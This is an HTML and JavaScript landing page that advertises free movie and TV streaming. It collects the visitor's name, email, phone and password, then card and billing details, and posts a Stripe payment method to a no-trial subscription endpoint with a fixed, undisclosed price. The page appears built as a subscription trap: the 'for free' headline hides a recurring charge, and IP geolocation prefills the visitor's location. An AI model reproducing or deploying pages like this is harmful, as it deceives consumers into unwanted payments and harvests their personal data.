<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Stream Your Favorite Movies & TV Shows</title>
  <style>
    :root{
      --bg:#111318; --panel:#1b1f27; --panel2:#222733; --text:#eaeef6; --muted:#97a0b3; --accent:#58f; --accent2:#2dd4bf; --warn:#ffd76b; --line:#2b3140; --radius:14px;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;}

    .strip img{width:100%; height:60px; object-fit:cover; display:block;}

    .hero{ max-width:960px; margin:30px auto; padding:0 20px; }

    .headline{ font-size:42px; line-height:1.2; font-weight:900; text-transform:uppercase; text-align:center; margin-bottom:20px; }

    .notice{ background:var(--panel2); border:1px solid var(--line); border-radius:var(--radius); padding:16px; margin-bottom:20px; text-align:center; }
    .steps{ margin-top:14px; display:flex; justify-content:space-around; font-size:14px; color:var(--muted) }

    .form-panel{ background:var(--panel); border:1px solid var(--line); border-radius:var(--radius); padding:24px; }
    .panel-title{ font-size:20px; font-weight:900; margin-bottom:12px; text-align:center }
    .small{ font-size:13px; color:var(--muted); margin-bottom:18px; text-align:center }

    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
    @media (max-width:520px){ .grid{ grid-template-columns:1fr } }

    .input, .select, .el{ width:100%; background:#0f131b; color:var(--text); border:1px solid #2b3140; border-radius:10px; padding:12px; font-size:15px; }
    .input::placeholder{ color:#6f7a93 }
    .btn{ width:100%; border:none; border-radius:12px; padding:12px 16px; font-weight:900; font-size:16px; cursor:pointer; background:linear-gradient(180deg, #7aa3ff, #4572ff); color:#fff; margin-top:15px }
    .btn.muted{ background:#1f2532; color:#cbd3e6; border:1px solid #2b3140; box-shadow:none }

    .step{ display:none }
    .step[aria-hidden="false"]{ display:block }

    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; grid-column:1 / -1 }
    @media (max-width:520px){ .phone-wrap{ grid-template-columns:1fr } }

    .err{ display:none; background:#3a1820; border:1px solid #803246; color:#ffb1bd; padding:10px; border-radius:10px; font-size:14px; margin-top:10px }
    .err[aria-hidden="false"]{ display:block }
  </style>
</head>
<body>
  <div class="strip"><img src="bar.png" alt="movie bar"/></div>

  <main class="hero">
    <h1 class="headline">STREAM YOUR FAVORITE MOVIES & TV SHOWS FOR FREE</h1>

    <div class="notice">
      <p>You need to register before you can stream. Please create a free account.</p>
      <div class="steps">
        <div>1. Account info</div>
        <div>2. Payment</div>
        <div>3. Enjoy</div>
      </div>
    </div>

    <section class="form-panel">
      <!-- STEP 1 -->
      <div id="step1" class="step" aria-hidden="false">
        <h2 class="panel-title">Join for Free</h2>
        <p class="small">Please enter your details to continue.</p>
        <div class="grid">
          <input id="nameInput" class="input" placeholder="Full name" autocomplete="name" required>
          <input id="emailInput" class="input" placeholder="Email" type="email" autocomplete="email" required>
          <div class="phone-wrap">
            <select id="phonePrefix" class="select" aria-label="Country calling code"></select>
            <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national">
          </div>
          <input id="passwordInput" class="input" type="password" placeholder="Create a password" autocomplete="new-password" required>
        </div>
        <button id="nextBtn" class="btn">Continue →</button>
      </div>

      <!-- STEP 2 -->
      <div id="step2" class="step" aria-hidden="true">
        <h2 class="panel-title">Secure Payment</h2>
        <p class="small">Card details are encrypted and processed by Stripe.</p>

        <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Street address">
        <input id="billingCity" class="input" autocomplete="address-level2" placeholder="City">
        <input id="billingCountry" class="input" autocomplete="country" placeholder="Country">
        <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Postcode">

        <div id="card-number" class="el"></div>
        <div class="grid">
          <div><div id="card-expiry" class="el"></div></div>
          <div><div id="card-cvc" class="el"></div></div>
        </div>

        <div id="err" class="err" role="alert" aria-hidden="true"></div>

        <button id="backBtn" class="btn muted">← Back</button>
        <button id="payNow" class="btn">Start Streaming Securely</button>
      </div>
    </section>
  </main>

  <script src="https://js.stripe.com/v3"></script>
<script>
  window.addEventListener('DOMContentLoaded', () => {
    // ----- DOM -----
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const errBox = document.getElementById('err');
    const nextBtn = document.getElementById('nextBtn');
    const backBtn = document.getElementById('backBtn');
    const phonePrefix = document.getElementById('phonePrefix');
    const billingCity = document.getElementById('billingCity');
    const billingCountry = document.getElementById('billingCountry');

    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/subscribe-notrial";
    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
    const FIXED_PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W";
    const API_BASE = (location.protocol.startsWith('http') ? location.origin : 'http://localhost:10000');

    function show(o){ o?.setAttribute('aria-hidden','false'); }
    function hide(o){ o?.setAttribute('aria-hidden','true'); }

    const CALLING_CODES = {
  US:'+1', CA:'+1', GB:'+44', IE:'+353', AU:'+61', NZ:'+64',
  DE:'+49', FR:'+33', ES:'+34', IT:'+39', NL:'+31', BE:'+32',
  CH:'+41', AT:'+43', DK:'+45', NO:'+47', SE:'+46', FI:'+358',
  PT:'+351', PL:'+48', CZ:'+420', HU:'+36', RO:'+40',
  BR:'+55', MX:'+52', AR:'+54', CL:'+56', CO:'+57', ZA:'+27',
  IN:'+91', SG:'+65', MY:'+60', TH:'+66', VN:'+84', PH:'+63',
  HK:'+852', JP:'+81', KR:'+82', AE:'+971', SA:'+966', TR:'+90', IL:'+972',
  GE:'+995' // <-- Georgia
    };
    const COUNTRY_NAMES = {
      US:'United States', CA:'Canada', GB:'United Kingdom', IE:'Ireland',
      AU:'Australia', NZ:'New Zealand', DE:'Germany', FR:'France', ES:'Spain', IT:'Italy',
      NL:'Netherlands', BE:'Belgium', CH:'Switzerland', AT:'Austria', DK:'Denmark', NO:'Norway',
      SE:'Sweden', FI:'Finland', PT:'Portugal', PL:'Poland', CZ:'Czechia', HU:'Hungary', RO:'Romania',
      BR:'Brazil', MX:'Mexico', AR:'Argentina', CL:'Chile', CO:'Colombia', ZA:'South Africa',
      IN:'India', SG:'Singapore', MY:'Malaysia', TH:'Thailand', VN:'Vietnam', PH:'Philippines',
      HK:'Hong Kong', JP:'Japan', KR:'South Korea', AE:'United Arab Emirates', SA:'Saudi Arabia', TR:'Turkey', IL:'Israel'
    };
    function populatePrefixOptions(){
      if(!phonePrefix) return;
      phonePrefix.innerHTML='';
      const priority=['US','GB','CA','AU','DE','FR','ES','IT','NL','SE','IN','JP'];
      const seen=new Set();
      const add=(cc)=>{ if(seen.has(cc) || !CALLING_CODES[cc]) return; seen.add(cc); const label=`${CALLING_CODES[cc]} — ${COUNTRY_NAMES[cc]||cc}`; phonePrefix.append(new Option(label, CALLING_CODES[cc])); };
      priority.forEach(add);
      Object.keys(CALLING_CODES).sort((a,b)=> (COUNTRY_NAMES[a]||a).localeCompare(COUNTRY_NAMES[b]||b)).forEach(add);
      if(!phonePrefix.value) phonePrefix.value=CALLING_CODES.US;
    }
    populatePrefixOptions();

    // ===== IP Prefill (robust) =====
    const withTimeout=(ms,p)=>Promise.race([p,new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),ms))]);
    function guessFromLocale(){ const region=(navigator.language||'').split('-')[1]; if(region && CALLING_CODES[region]) return {prefix:CALLING_CODES[region], country:COUNTRY_NAMES[region]||region}; return null; }
    async function hydrateFromIP(){
      try{
        const try1=()=>withTimeout(2000, fetch('https://ipapi.co/json/').then(r=>r.json()));
        const try2=()=>withTimeout(2000, fetch('https://ipwho.is/?fields=city,country,country_code,phone').then(r=>r.json()));
        const try3=()=>withTimeout(2000, fetch('https://ipinfo.io/json').then(r=>r.json()));
        let d=null; try{ d=await try1(); }catch{} if(!d||d.error){ try{ d=await try2(); }catch{} } if(!d||d.error){ try{ d=await try3(); }catch{} }
        let prefix=null, city=null, country=null, code=null;
        if(d){ prefix=d.country_calling_code || (d.phone?('+'+String(d.phone)):null); city=d.city||null; country=d.country_name||d.country||null; code=d.country_code||d.countryCode||null; if(!prefix && code && CALLING_CODES[code]) prefix=CALLING_CODES[code]; if(!country && code && COUNTRY_NAMES[code]) country=COUNTRY_NAMES[code]; }
        if(!prefix){ const guess=guessFromLocale(); if(guess){ prefix=guess.prefix; country=country||guess.country; } }
        if(prefix && phonePrefix) phonePrefix.value=prefix; if(city && billingCity) billingCity.value=city; if(country && billingCountry) billingCountry.value=country;
      }catch{ const guess=guessFromLocale(); if(guess && phonePrefix){ phonePrefix.value=guess.prefix; if(billingCountry && !billingCountry.value) billingCountry.value=guess.country; } }
    }
    hydrateFromIP();
    document.getElementById('phoneNumber')?.addEventListener('focus', hydrateFromIP);

    // ===== Nav between steps (single handlers) =====
    nextBtn?.addEventListener('click', async ()=>{ hide(step1); show(step2); try{ await ensureAccount(); }catch(e){ if(errBox){ errBox.textContent='Account setup warning: '+(e.message||'check details'); errBox.setAttribute('aria-hidden','false'); } } });
    backBtn?.addEventListener('click', ()=>{ hide(step2); show(step1); });

    // ===== Stripe (guarded so page never blanks) =====
    let stripe, elements, cardNumber, cardExpiry, cardCvc;
    try{
      if(window.Stripe){
        stripe = Stripe(PUBLISHABLE_KEY);
        elements = stripe.elements();
        cardNumber = elements.create('cardNumber');
        cardExpiry = elements.create('cardExpiry');
        cardCvc    = elements.create('cardCvc');
        cardNumber.mount('#card-number');
        cardExpiry.mount('#card-expiry');
        cardCvc.mount('#card-cvc');
      }
    }catch(e){ console.warn('Stripe init skipped:', e); }

    async function ensureAccount(){
      const email = document.getElementById('emailInput')?.value.trim();
      const password = document.getElementById('passwordInput')?.value;
      const prefix = phonePrefix?.value || '';
      const raw = (document.getElementById('phoneNumber')?.value || '').replace(/[^0-9]/g,'');
      const phone = raw ? (prefix + raw) : '';
      if(!email || !password) throw new Error('Email and password required');
      const r = await fetch(API_BASE + '/api/register',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ email, password, phone }) });
      if(r.status===201) return true; let data={}; try{ data=await r.json(); }catch{} if(r.status===400 && (data.error||'').toLowerCase().includes('exists')) return true; throw new Error(data.error || 'Registration failed');
    }

    document.getElementById('payNow')?.addEventListener('click', async ()=>{
      if(!stripe){ alert('Payment temporarily unavailable. Please check your connection and try again.'); return; }
      errBox?.setAttribute('aria-hidden','true'); if(errBox) errBox.textContent='';
      const name = document.getElementById('nameInput')?.value.trim();
      const email = document.getElementById('emailInput')?.value.trim();
      const raw = (document.getElementById('phoneNumber')?.value || '').replace(/[^0-9]/g,'');
      const fullPhone = raw ? ((phonePrefix?.value||'') + raw) : undefined;
      const address = {
        line1: (document.getElementById('billingStreet')?.value||'').trim()||undefined,
        city: (billingCity?.value||'').trim()||undefined,
        country: (billingCountry?.value||'').trim()||undefined,
        postal_code: (document.getElementById('billingPostcode')?.value||'').trim()||undefined
      };
      try{
        const pmRes = await stripe.createPaymentMethod({ type:'card', card:cardNumber, billing_details:{ name:name||undefined, email:email||undefined, phone:fullPhone, address } });
        if(pmRes.error) throw new Error(pmRes.error.message);
        const resp = await fetch(SUBSCRIBE_URL,{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ priceId: FIXED_PRICE_ID, paymentMethodId: pmRes.paymentMethod.id, name, email }) });
        const data = await resp.json(); if(!data.clientSecret) throw new Error(data.error || 'Payment failed to start');
        const conf = await stripe.confirmCardPayment(data.clientSecret); if(conf.error) throw new Error(conf.error.message);
        if(conf.paymentIntent && conf.paymentIntent.status==='succeeded'){ window.location.href='thankyou.html'; } else { throw new Error('Payment not completed'); }
      }catch(err){ if(errBox){ errBox.textContent = err.message || 'Something went wrong.'; errBox.setAttribute('aria-hidden','false'); } }
    });
  });
</script>
</body>
</html>
